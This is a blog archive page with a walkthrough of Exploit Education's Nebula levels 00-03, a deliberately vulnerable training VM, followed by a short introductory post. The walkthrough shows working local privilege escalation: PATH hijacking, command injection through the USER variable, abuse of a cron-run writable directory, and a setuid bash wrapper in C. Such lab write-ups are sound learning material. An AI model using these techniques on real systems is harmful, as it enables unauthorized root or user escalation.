<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>blog.smigiel.dev | Articles by dasm</title>
    <link rel="shortcut icon" type="image/png" href="https://blog.smigiel.dev/favicon.png">
    <link rel="shortcut icon" type="image/x-icon" href="https://blog.smigiel.dev/favicon.ico">
    <link href="https://blog.smigiel.dev/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="blog.smigiel.dev Full Atom Feed" />
    <link rel="stylesheet" href="https://blog.smigiel.dev/theme/css/main.css" type="text/css" />
    <link rel="stylesheet" href="https://blog.smigiel.dev/theme/css/pygments.css" type="text/css" />
    <meta name="generator" content="Pelican" />
    <meta name="description" content="" />
    <meta name="author" content="dasm" />
</head>
<body>
    <header>
        <nav>
            <ul>

                <li class="ephemeral selected"><a href="https://blog.smigiel.dev/author/dasm2.html">dasm</a></li>
                <li><a href="https://blog.smigiel.dev/">Home</a></li>
                <li><a href="https://blog.smigiel.dev/pages/about-me.html">About me</a></li>
                <li><a href="https://blog.smigiel.dev/archives">Archives</a></li>
            </ul>
        </nav>
        <div class="header_box">
            <h1><a href="https://blog.smigiel.dev/">blog.smigiel.dev</a></h1>
        </div>
    </header>
    <div id="wrapper">
        <div id="content">            <h4 class="date">Sep 05, 2020</h4>

            <article class="post">
                <h2 class="title">
                    <a href="https://blog.smigiel.dev/exploit-education-nebula-part-1.html" rel="bookmark" title="Permanent Link to &quot;Exploit Education - Nebula Part 1&quot;">Exploit Education - Nebula Part 1</a>
                </h2>

                
                

                <h1><a href="https://exploit.education/nebula/">Nebula</a></h1>
<h2>Basics</h2>
<p>Nebula VM has 20 levels. Each level can be accessed with <code>levelXX</code> username and the same password.</p>
<h2><a href="https://exploit.education/nebula/level-00/">Level 00</a></h2>
<h4>Solution</h4>
<div class="highlight"><pre><span></span>find / -type f -user flag00 -perm -0400 <span class="m">2</span>&gt;/dev/null
</pre></div>


<p>Search for all files, in all directories, belonging to <code>flag00</code> user, with <a href="https://en.wikipedia.org/wiki/Setuid">setuid</a>. Redirect all "permission error" (stderr) messages to <code>/dev/null</code> discarding those messages.</p>
<h4>Result</h4>
<div class="highlight"><pre><span></span>level00@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
level00@nebula:~$ find / -type f -user flag00 -perm -0400 <span class="m">2</span>&gt;/dev/null
/bin/.../flag00
/home/flag00/.bash_logout
/home/flag00/.bashrc
/home/flag00/.profile
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
</pre></div>


<h2><a href="https://exploit.education/nebula/level-01/">Level01</a></h2>
<h4>Solution</h4>
<p>Program allows to execute arbitrary program due to <code>system</code> call for <code>echo</code>.
Let's create fake echo with to run <code>bash</code> session with <code>flag01</code> UID.</p>
<h4>Result</h4>
<div class="highlight"><pre><span></span>level01@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
level01@nebula:~$ cat &gt; /tmp/echo <span class="s">&lt;&lt; EOF</span>
<span class="s">&gt; #!/usr/bin/env bash</span>
<span class="s">&gt; bash</span>
<span class="s">&gt; EOF</span>
level01@nebula:~$ chmod +x /tmp/echo
level01@nebula:~$ <span class="nb">cd</span> ~flag01/
level01@nebula:/home/flag01$ ./flag01
and now what?
level01@nebula:/home/flag01$ <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span> ./flag01
flag01@nebula:/home/flag01$ getflag
You have successfully executed getflag on a target account
</pre></div>


<h2><a href="https://exploit.education/nebula/level-02/">Level02</a></h2>
<h4>Solution</h4>
<p>Program is reading <code>USER</code> variable, which can be provided by attacker.</p>
<h4>Result</h4>
<div class="highlight"><pre><span></span>level02@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
level02@nebula:~$ <span class="nv">USER</span><span class="o">=</span><span class="s2">&quot;;bash #&quot;</span> /home/flag02/flag02
about to call system<span class="o">(</span><span class="s2">&quot;/bin/echo ;bash # is cool&quot;</span><span class="o">)</span>

flag02@nebula:~$ getflag
You have successfully executed getflag on a target account
</pre></div>


<h2><a href="https://exploit.education/nebula/level-03/">Level03</a></h2>
<h4>Solution</h4>
<p>Cron is running script which is picking up content of <code>writable.d</code> directory. It is executing whatever is there. It means, that anything what is running via cron, will have the same permissions.</p>
<h4>Result</h4>
<div class="highlight"><pre><span></span>level03@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
level03@nebula:~$ <span class="nb">cd</span> ~flag03
level03@nebula:/home/flag03$ cat &gt; writable.d/flag <span class="s">&lt;&lt; EOF</span>
<span class="s">&gt; #!/usr/bin/env bash</span>
<span class="s">&gt; getflag &gt; /tmp/flag.result</span>
<span class="s">&gt; EOF</span>
level03@nebula:/home/flag03$ cat /tmp/flag.result
You have successfully executed getflag on a target account
</pre></div>


<h4>Solution2</h4>
<p>Prepare simple C program to gain bash access</p>
<h4>Result2</h4>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>

  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>


<div class="highlight"><pre><span></span>level03@nebula:/tmp$ cat &gt; /home/flag03/writable.d/exploit.sh <span class="s">&lt;&lt; EOF</span>
<span class="s">&gt; #!/usr/bin/env bash</span>
<span class="s">&gt; cp /tmp/exploit /home/flag03/exploitable</span>
<span class="s">&gt; chmod u+s /home/flag03/exploitable</span>
<span class="s">&gt; EOF</span>
</pre></div>


<h4>Mistakes</h4>
<h5>First</h5>
<p>I tried to create copy of <code>exploit</code> program in <code>/tmp</code> directory. However, when I tried to run it, it didn't give me <code>flag03</code> user. After looking into <code>/etc/fstab</code> it became obvious:</p>
<div class="highlight"><pre><span></span><span class="err">flag03@nebula:/home/flag03$ cat /etc/fstab</span>
<span class="err">overlayfs / overlayfs rw 0 0</span>
<span class="err">tmpfs /tmp tmpfs nosuid,nodev 0 0</span>
</pre></div>


<p><code>tmpfs</code> has <code>nosuid</code> option. It means, that the nosuid mount option specifies that the filesystem cannot contain set userid files.</p>
<h5>Second</h5>
<p>When I found that <code>nosetuid</code> is preventing from running program from within <code>/tmp</code>, I decided to copy <code>exploit</code> to <code>/home/level03</code>. It failed, because default user running <code>writable.sh</code> wasn't <code>root</code> but <code>flag03</code>. Solution was to copy payload to <code>/home/flag03</code> directory.</p>
                <div class="clear"></div>

                <div class="info">
                    <a href="https://blog.smigiel.dev/exploit-education-nebula-part-1.html">posted at 00:00</a>
                    &nbsp;&middot;
                    &nbsp;<a href="https://blog.smigiel.dev/tag/learning.html" class="tags">learning</a>
                    &nbsp;<a href="https://blog.smigiel.dev/tag/ctf.html" class="tags">ctf</a>
                    &nbsp;<a href="https://blog.smigiel.dev/tag/exploit.html" class="tags">exploit</a>
                    &nbsp;<a href="https://blog.smigiel.dev/tag/nebula.html" class="tags">nebula</a>
                </div>
            </article>            <h4 class="date">Aug 20, 2020</h4>

            <article class="post">
                <h2 class="title">
                    <a href="https://blog.smigiel.dev/hello-world.html" rel="bookmark" title="Permanent Link to &quot;Hello, world!&quot;">Hello, world!</a>
                </h2>

                
                

                <p>Hey, I'm Dariusz. I'm cybersecurity wannabe.
This is an attempt to document my road to understand quirks of this world.</p>
<p>Let me say it loud and clear. I don't like doing stuff "easy way". It is not something that I should be proud of. What I mean by that? I mean, that instead of starting writing, producing some content, I'm spending my time looking for "right" tool, "correct" template or anything like that. From the very beginning, blog layout needs to be pixel-perfect. There is no place for mistake. Everything needs to be perfect. But, can it be done differently?</p>
<p>This is an attempt do it "new way". Instead of waiting, thinking, designing... let's produce some content.
Later, I can refine that. When time permits.</p>
                <div class="clear"></div>

                <div class="info">
                    <a href="https://blog.smigiel.dev/hello-world.html">posted at 00:00</a>
                    &nbsp;&middot;
                    &nbsp;<a href="https://blog.smigiel.dev/tag/publishing.html" class="tags">publishing</a>
                </div>
            </article>

                <div class="clear"></div>
                <div class="pages">

                    <a href="https://blog.smigiel.dev/author/dasm.html" class="prev_page">&larr;&nbsp;Previous</a>


                    <span>Page 2 of 2</span>
                </div>

            <div class="clear"></div>
            <footer>
                <p>
                <a href="https://github.com/jody-frankowski/blue-penguin">Blue Penguin</a> Theme
                &middot;
                Powered by <a href="http://getpelican.com">Pelican</a>
                &middot;
                <a href="https://blog.smigiel.dev/feeds/all.atom.xml" rel="alternate">Atom Feed</a>
            </footer>
        </div>
        <div class="clear"></div>
    </div>
</body>
</html>